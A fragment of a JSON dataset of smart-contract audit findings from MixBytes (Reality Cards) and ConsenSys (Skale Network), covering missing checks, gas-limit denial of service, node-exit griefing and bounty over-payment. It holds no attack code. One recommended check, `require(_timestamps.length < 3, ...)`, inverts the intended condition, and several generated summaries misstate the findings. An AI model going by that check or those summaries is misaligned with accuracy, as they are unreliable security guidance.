      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Reality%20Cards/README.md#4-self-explainable-naming",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "28559",
      "title": "Difficult calculation of uint max",
      "impact": "LOW",
      "content": "##### Description\nSee these lines: \n- https://github.com/RealityCards/RealityCards-Contracts/tree/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCMarket.sol#L29 \n- https://github.com/RealityCards/RealityCards-Contracts/tree/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCMarket.sol#L30\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyMainnet.sol#L91\n\nBoth of this values are worked out by strange way. E.g. 2**256 for uint256 will get 0.\nBut there are simpler ways to calculate the maximum value. For example:\n- `uint256 public constant MAX_UINT256 = uint256(-1);`\n- `uint256 public constant MAX_UINT256 = type(uint256).max;`\n\n##### Recommendation\nIt is recommended to make it clearer.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Reality Cards",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Reality%20Cards/README.md#3-difficult-calculation-of-uint-max",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "28558",
      "title": "Incorrect function name",
      "impact": "LOW",
      "content": "##### Description\nIn some function `setSomeValue()` the value of boolean variable `someValue` is reversed. But by setting it means setting any value and the value may not even change. It would be more correct to call not \"Set\", but \"Change\". This can be seen on the following lines:\n\n- https://github.com/RealityCards/RealityCards-Contracts/tree/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCFactory.sol#L187 \n- https://github.com/RealityCards/RealityCards-Contracts/tree/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCFactory.sol#L197\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCFactory.sol#L216\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCFactory.sol#L226\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCFactory.sol#L232\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCFactory.sol#L237\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCFactory.sol#L242\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCTreasury.sol#L125\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCTreasury.sol#L130\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyMainnet.sol#L137 \n\n##### Recommendation\nIt is recommended to rename a `setSomeValue()` function to `changeSomeValue()`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Reality Cards",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Reality%20Cards/README.md#2-incorrect-function-name",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "28557",
      "title": "Missing the check whether `_timestamps` has an appropriate length",
      "impact": "LOW",
      "content": "##### Description\nAt the lines \n- https://github.com/RealityCards/RealityCards-Contracts/tree/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCFactory.sol#L312-L313\n- https://github.com/RealityCards/RealityCards-Contracts/tree/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCFactory.sol#L317\n- https://github.com/RealityCards/RealityCards-Contracts/tree/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCFactory.sol#L320\n- https://github.com/RealityCards/RealityCards-Contracts/tree/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCFactory.sol#L352 \nhave operations with elements of the `_timestamps` array. It is possible that the number of transferred elements of the `_timestamps` array will be less than 3. In this case, a reference will be made to a nonexistent array element.\nFor clean code, it is better to avoid this situation and check the length of the array. \n\n##### Recommendation\nIt is recommended to check the number of array elements:\n`require(_timestamps.length < 3, \"Incorrect number of array elements\");`",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Reality Cards",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Reality%20Cards/README.md#1-missing-the-check-whether-_timestamps-has-an-appropriate-length",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "28556",
      "title": "Use general `safeTransferFrom`",
      "impact": "MEDIUM",
      "content": "##### Description\nIt is required to check success of transfer. So it is should be handled as in ERC20:\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/nfthubs/RCNftHubXdai.sol#L69\n\n##### Recommendation\nIt is recommended to use the `safeTransferFrom()` method from the ERC20 safe library.",
      "summary": "\nThis bug report is about a transfer from a RealityCards-Contracts repository to an RCNftHubXdai.sol file. The bug report recommends using the `safeTransferFrom()` method from the ERC20 safe library to check the success of the transfer. This is a useful method to ensure the transfer is successful and secure. The ERC20 safe library offers additional security features such as the ability to check the allowance and balance of an address before the transfer is made, and it also provides a way to track the transfer for auditing purposes. Additionally, it is important to note that this method is only applicable to transfers between ERC20 tokens and not other types of tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Reality Cards",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Reality%20Cards/README.md#2-use-general-safetransferfrom",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "28555",
      "title": "Check that the address is not zero",
      "impact": "MEDIUM",
      "content": "##### Description\nThe following lines use address variables. But if the value turns out to be zero, funds will be lost:\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/RCTreasury.sol#L163\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyMainnet.sol#L70\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyMainnet.sol#L75\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyMainnet.sol#L80\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyMainnet.sol#L85\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyMainnet.sol#L90\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyMainnet.sol#L100\n- https://github.com/RealityCards/RealityCards-Contracts/blob/fd3b713d1a15f92ebc329f85038b76563f1587b8/contracts/bridgeproxies/RCProxyMainnet.sol#L104\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyXdai.sol#L95\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyXdai.sol#L100\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyXdai.sol#L105\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyXdai.sol#L110\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyXdai.sol#L120\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyXdai.sol#L142-L149\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/bridgeproxies/RCProxyXdai.sol#L182\n- https://github.com/RealityCards/RealityCards-Contracts/blob/8c0b05b25a7deef25f98532ae2f8afd4f9a84360/contracts/nfthubs/RCNftHubMainnet.sol#L29\n\n##### Recommendation\nIt is recommended to add a check that address is valid.",
      "summary": "\nThis bug report is related to the RealityCards-Contracts Github repository. The issue is that if the value of an address variable turns out to be zero, funds will be lost. This is due to the lack of a check to ensure that the address is valid. To fix this issue, it is recommended to add a check that the address is valid. This bug report references several lines in the RealityCards-Contracts Github repository, which are listed in the description.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Reality Cards",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Reality%20Cards/README.md#1-check-that-the-address-is-not-zero",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "28554",
      "title": "Use msgSender instead of msg.sender in Event param",
      "impact": "HIGH",
      "content": "##### Description\nSince the contract uses metatransactions everywhere (and uses NativeMetaTransaction), you should always use `msgSender()`\n- https://github.com/RealityCards/RealityCards-Contracts/blob/fd3b713d1a15f92ebc329f85038b76563f1587b8/contracts/RCMarket.sol#L584\n\notherwise the event parameter maybe not correct\n\nlook at the logic at https://github.com/RealityCards/RealityCards-Contracts/blob/fd3b713d1a15f92ebc329f85038b76563f1587b8/contracts/lib/NativeMetaTransaction.sol#L105\n\nBut at https://github.com/RealityCards/RealityCards-Contracts/blob/fd3b713d1a15f92ebc329f85038b76563f1587b8/contracts/RCMarket.sol#L579 the `msgSender()`, so it is used what is not consistent.\n\n##### Recommendation\nIt is recommended to use `msgSender()` in all of `msg.sender` usages (see also: https://medium.com/biconomy/biconomy-supports-native-meta-transactions-243ce52a2a2b).",
      "summary": "\nThis bug report is regarding the usage of `msgSender()` in the RealityCards-Contracts repository. The contract uses metatransactions everywhere and uses NativeMetaTransaction, so `msgSender()` should always be used. This is because the event parameter may not be correct if `msg.sender` is used. The logic can be found at the given link. However, at the given link `msg.sender` is used instead of `msgSender()`, which is inconsistent. Therefore, it is recommended to use `msgSender()` in all of `msg.sender` usages.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Reality Cards",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Reality%20Cards/README.md#1-use-msgsender-instead-of-msgsender-in-event-param",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "13603",
      "title": "Typos",
      "impact": "LOW",
      "content": "#### Description\n\n\nThere are a few typos in the contract source code. This could result in unforeseeable issues in the future development cycles.\n\n\n#### Examples\n\n\n**succesful** instead of **successful**:\n\n\n**code/contracts/SkaleDKG.sol:L77-L78**\n\n\n\n```\nmapping(bytes32 => uint) public lastSuccesfulDKG;\n\n\n```\n**code/contracts/SkaleDKG.sol:L372-L373**\n\n\n\n```\n    \\_setSuccesfulDKG(schainId);\n}\n\n```\nand many other instances of `succesful` through out the code.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Network",
      "source_link": "https://consensys.net/diligence/audits/2020/10/skale-network/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13602",
      "title": "Adding a new schain may potentially hit the gas limit  Pending",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nSkale team’s comment:\n\n\n\n```\nAcknowledged, assigned as the work for the next few months (improvement) Please assign as “Pending”.\r\n\n```\n\n\n\n#### Description\n\n\nWhen adding a new schain, a group of random 16 nodes is randomly selected to run that schain. In order to do so, the `_generateGroup` function iterates over all the nodes that can be used for that purpose:\n\n\n**code/contracts/SchainsInternal.sol:L522-L541**\n\n\n\n```\nfunction \\_generateGroup(bytes32 schainId, uint numberOfNodes) private returns (uint[] memory nodesInGroup) {\n    Nodes nodes = Nodes(contractManager.getContract(\"Nodes\"));\n    uint8 space = schains[schainId].partOfNode;\n    nodesInGroup = new uint[](numberOfNodes);\n\n    uint[] memory possibleNodes = isEnoughNodes(schainId);\n    require(possibleNodes.length >= nodesInGroup.length, \"Not enough nodes to create Schain\");\n    uint ignoringTail = 0;\n    uint random = uint(keccak256(abi.encodePacked(uint(blockhash(block.number.sub(1))), schainId)));\n    for (uint i = 0; i < nodesInGroup.length; ++i) {\n        uint index = random % (possibleNodes.length.sub(ignoringTail));\n        uint node = possibleNodes[index];\n        nodesInGroup[i] = node;\n        \\_swap(possibleNodes, index, possibleNodes.length.sub(ignoringTail).sub(1));\n        ++ignoringTail;\n\n        \\_exceptionsForGroups[schainId][node] = true;\n        addSchainForNode(node, schainId);\n        require(nodes.removeSpaceFromNode(node, space), \"Could not remove space from Node\");\n    }\n\n```\nIf the total number of nodes exceeds around a few thousands, adding a schain may hit the block gas limit.\n\n\n#### Recommendation\n\n\nAvoid iterating over all nodes when selecting a random node for a schain.",
      "summary": "\nThis bug report is about a problem encountered when adding a new schain to the system. The problem is that when the total number of nodes exceeds a few thousand, the process of adding a schain may hit the block gas limit. This is because the `_generateGroup` function iterates over all the nodes that can be used for that purpose. To fix this problem, the Skale team suggests avoiding iterating over all nodes when selecting a random node for a schain. The team has assigned this improvement as the work for the next few months and has marked it as \"Pending\".",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Network",
      "source_link": "https://consensys.net/diligence/audits/2020/10/skale-network/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13601",
      "title": "Removing a node require multiple transactions and may be very expensive  Pending",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nSkale team’s comment:\n\n\n\n```\nAcknowledged, assigned as the work for the next few months  (improvement). Please assign it as “Pending”.\r\n\n```\n\n\n\n#### Description\n\n\nWhen removing a node from the network, the owner should redistribute all the schains that are currently on that node to the other nodes. To do so, the validator should call the `nodeExit` function of the `SkaleManager` contract. In this function, only one schain is going to be removed from the node. So the node would have to call the `nodeExit` function as many times as there are schains in the node. Every call iterates over every potential node that can be used as a replacement (like in <https://github.com/ConsenSys/skale-network-audit-2020-10/issues/3)>.\n\n\nIn addition to that, the first call will iterate over all schains in the node, make 4 SSTORE operations and external calls for each schain:\n\n\n**code/contracts/NodeRotation.sol:L204-L210**\n\n\n\n```\nfunction \\_startRotation(bytes32 schainIndex, uint nodeIndex) private {\n    ConstantsHolder constants = ConstantsHolder(contractManager.getContract(\"ConstantsHolder\"));\n    rotations[schainIndex].nodeIndex = nodeIndex;\n    rotations[schainIndex].newNodeIndex = nodeIndex;\n    rotations[schainIndex].freezeUntil = now.add(constants.rotationDelay());\n    waitForNewNode[schainIndex] = true;\n}\n\n```\nThis may hit the block gas limit even easier than [issue 5.4](#adding-a-new-schain-may-potentially-hit-the-gas-limit).\n\n\nIf the first transaction does not hit the block’s gas limit, the maximum price of deleting a node would be BLOCK\\_GAS\\_COST \\* 128. At the moment, it’s around $50,000.\n\n\n#### Recommendation\n\n\nOptimize the process of deleting a node, so it can’t hit the gas limit in one transaction, and the overall price should be cheaper.",
      "summary": "\nThis bug report is about the process of removing a node from the Skale network. The current process involves calling the `nodeExit` function of the `SkaleManager` contract multiple times, which can lead to the transaction hitting the block's gas limit. This could potentially cost up to $50,000. The Skale team has acknowledged the issue and assigned it as work for the next few months. The recommendation is to optimize the process of deleting a node, so it can't hit the gas limit in one transaction, and the overall price should be cheaper.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Network",
      "source_link": "https://consensys.net/diligence/audits/2020/10/skale-network/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13600",
      "title": "A node exit prevents some other nodes from exiting for some period  Pending",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nSkale team’s comment:\n\n\n\n```\nknown issue, acknowledged, assigned as the work for the next few months as an improvement. Please assign as “Pending”.\r\n\n```\n\n\n\n#### Description\n\n\nWhen a node wants to exit, the `nodeExit` function should be called as many times, as there are schains in the node. Each time one schain is getting removed from the node. During every call, all the active schains are getting frozen for 12 hours.\n\n\n**code/contracts/NodeRotation.sol:L84-L105**\n\n\n\n```\nfunction freezeSchains(uint nodeIndex) external allow(\"SkaleManager\") {\n    SchainsInternal schainsInternal = SchainsInternal(contractManager.getContract(\"SchainsInternal\"));\n    bytes32[] memory schains = schainsInternal.getActiveSchains(nodeIndex);\n    for (uint i = 0; i < schains.length; i++) {\n        Rotation memory rotation = rotations[schains[i]];\n        if (rotation.nodeIndex == nodeIndex && now < rotation.freezeUntil) {\n            continue;\n        }\n        string memory schainName = schainsInternal.getSchainName(schains[i]);\n        string memory revertMessage = \"Node cannot rotate on Schain \";\n        revertMessage = revertMessage.strConcat(schainName);\n        revertMessage = revertMessage.strConcat(\", occupied by Node \");\n        revertMessage = revertMessage.strConcat(rotation.nodeIndex.uint2str());\n        string memory dkgRevert = \"DKG process did not finish on schain \";\n        ISkaleDKG skaleDKG = ISkaleDKG(contractManager.getContract(\"SkaleDKG\"));\n        require(\n            skaleDKG.isLastDKGSuccessful(keccak256(abi.encodePacked(schainName))),\n            dkgRevert.strConcat(schainName));\n        require(rotation.freezeUntil < now, revertMessage);\n        \\_startRotation(schains[i], nodeIndex);\n    }\n}\n\n```\nBecause of that, no other node that is running one of these schains can exit during that period. In the worst-case scenario, one malicious node has 128 Schains and calls `nodeExit` every 12 hours. That means that some nodes will not be able to exit for 64 days.\n\n\n#### Recommendation\n\n\nMake node exiting process less synchronous.",
      "summary": "\nThis bug report concerns the `nodeExit` function in the `NodeRotation.sol` file. The issue is that when a node wants to exit, the `nodeExit` function should be called as many times as there are schains in the node. Each time one schain is removed from the node, all the active schains are frozen for 12 hours, meaning that no other node running one of these schains can exit during that period. In the worst-case scenario, one malicious node running 128 Schains can call `nodeExit` every 12 hours, meaning that some nodes will not be able to exit for 64 days. The Skale team has acknowledged this issue and assigned it as an improvement to be worked on in the next few months. The recommendation is to make the node exiting process less synchronous.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Network",
      "source_link": "https://consensys.net/diligence/audits/2020/10/skale-network/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13599",
      "title": "Every node gets a full validator’s bounty ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThis issue is addressed in [Bug/skale 3273 formula fix 435](https://github.com/skalenetwork/skale-manager/pull/435) and [SKALE-3273 Fix BountyV2 populating error 438](https://github.com/skalenetwork/skale-manager/pull/438).\n\n\nThe main change is related to how [bounties](https://skale.network/blog/network-bounties-and-delegation-workflow/) are calculated for each validator. Below are a few notes on these pull requests:\n\n\n* `nodesByValidator` mapping is no longer used in the codebase and the non-zero values are deleted when `calculateBounty()` is called for a specific validator. The mapping is kept in the code for compatible storage layout in upgradable proxies.\n* Some functions such as `populate()` was developed for the transition to the upgraded contracts (rewrite `_effectiveDelegatedSum` values based on the new calculation formula). This function is not part of this review and will be removed in the future updates.\n* Unlike the old architecture, `nodesByValidator[validatorId]` is no longer used within the system to calculate `_effectiveDelegatedSum` and bounties. This is replaced by using overall staked amount and duration.\n* If a validator does not claim their bounty during a month, it is considered as a misbehave and her bounty goes to the bounty pool for the next month.\n\n\n\n\n#### Description\n\n\nTo get the bounty, every node calls the `getBounty` function of the `SkaleManager` contract. This function can be called once per month. The size of the bounty is defined in the `BountyV2` contract in the `_calculateMaximumBountyAmount` function:\n\n\n**code/contracts/BountyV2.sol:L213-L221**\n\n\n\n```\nreturn epochPoolSize\n    .add(\\_bountyWasPaidInCurrentEpoch)\n    .mul(\n        delegationController.getAndUpdateEffectiveDelegatedToValidator(\n            nodes.getValidatorId(nodeIndex),\n            currentMonth\n        )\n    )\n    .div(effectiveDelegatedSum);\n\n```\nThe problem is that this amount actually represents the amount that should be paid to the validator of that node. But each node will get this amount. Additionally, the amount of validator’s bounty should also correspond to the number of active nodes, while this formula only uses the amount of delegated funds.\n\n\n#### Recommendation\n\n\nEvery node should get only their parts of the bounty.",
      "summary": "\nThe bug report is about a calculation issue related to the bounty of each validator in the Skale Network. The main change is related to how bounties are calculated for each validator. The problem is that the amount a validator should get is being divided among all nodes, rather than the validator receiving the full amount. The issue is addressed in two pull requests, Bug/skale 3273 formula fix 435 and SKALE-3273 Fix BountyV2 populating error 438. The main changes include deleting the `nodesByValidator` mapping, no longer using the mapping to calculate `_effectiveDelegatedSum` and bounties, and if a validator does not claim their bounty during a month, it being sent to the bounty pool for the next month. The recommendation is that each node should get only their parts of the bounty.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Network",
      "source_link": "https://consensys.net/diligence/audits/2020/10/skale-network/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    }
  ]
}